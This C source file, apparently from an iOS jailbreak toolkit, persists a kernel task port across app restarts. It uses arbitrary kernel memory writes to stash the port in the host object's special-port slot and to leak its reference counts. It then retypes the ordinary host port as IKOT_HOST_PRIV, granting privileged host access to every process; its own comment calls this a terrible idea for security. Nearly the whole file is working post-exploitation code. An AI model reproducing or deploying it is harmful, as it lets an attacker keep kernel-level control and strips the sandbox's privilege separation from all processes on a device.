#include <stdio.h>
#include <stdlib.h>
#include <mach/mach_port.h>

#include "kmem.h"
#include "symbols.h"
#include "find_port.h"
#include "persist_tfp0.h"

/*
 * Persist a mach port send right across a restart of the app.
 *
 * There aren't too many places where we can stash a port send right and grab it again
 * from this (or another) app inside the sandbox.
 *
 * The host_get_special_port API seems promising but it requires host_priv which an app doesn't have.
 *
 * here are the MIG intrans for host_t and host_priv_t:
 
host_t
convert_port_to_host_priv(
	ipc_port_t	port)
{
  host_t host = HOST_NULL;

  if (IP_VALID(port)) {
    ip_lock(port);
    if (ip_active(port) &&
      (ip_kotype(port) == IKOT_HOST_PRIV))
      host = (host_t) port->ip_kobject;
      ip_unlock(port);
  }

  return host;
}

host_t
convert_port_to_host(
  ipc_port_t	port)
{
  host_t host = HOST_NULL;

  if (IP_VALID(port)) {
    if (ip_kotype(port) == IKOT_HOST ||
        ip_kotype(port) == IKOT_HOST_PRIV) {
      host = (host_t) port->ip_kobject;
      assert(ip_active(port));
    }
  }
  return host;
}

 From this you can see that you need a send right to an IKOT_HOST_PRIV to get a host_priv_t, but
 both an IKOT_HOST and IKOT_HOST_PRIV can be used as a host_t. (this type checking is only relevant
 for the generated MIG code, the fact that both these methods return host_t is irrelevant.)
 
 What if we change the regular host port's type to IKOT_HOST_PRIV, that would mean that every process
 would be able to call MIG methods which check whether the sender has a send right to a host_priv port.
 
 Security-wise this is obviously a terrible idea, but for a dev tool it works :)
 */

#define IO_ACTIVE 0x80000000

#define IKOT_HOST 3
#define IKOT_HOST_PRIV 4


void make_host_into_host_priv() {
  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint32_t old = rk32(hostport_addr);
  printf("old host type: 0x%08x\n", old);
  wk32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
}

void persist_port(mach_port_t port) {
  // get the port address
  uint64_t port_to_persist = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
  
  // make sure the port won't go away:
  wk32(port_to_persist+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d); // leak references
  wk32(port_to_persist+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d); // leak srights
  
  
  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  // set port_to_persist as host special port 4
  // the first 16 bytes of realhost are a lock
  wk64(realhost+(6*8), port_to_persist);
  
  // make sure we can get that port later:
  make_host_into_host_priv();
}

mach_port_t try_restore_port() {
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err;
  err = host_get_special_port(mach_host_self(), 0, 4, &port);
  if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
    printf("got persisted port!\n");
    // make sure rk64 etc use this port
    return port;
  }
  printf("unable to retrieve persisted port\n");
  return MACH_PORT_NULL;
}
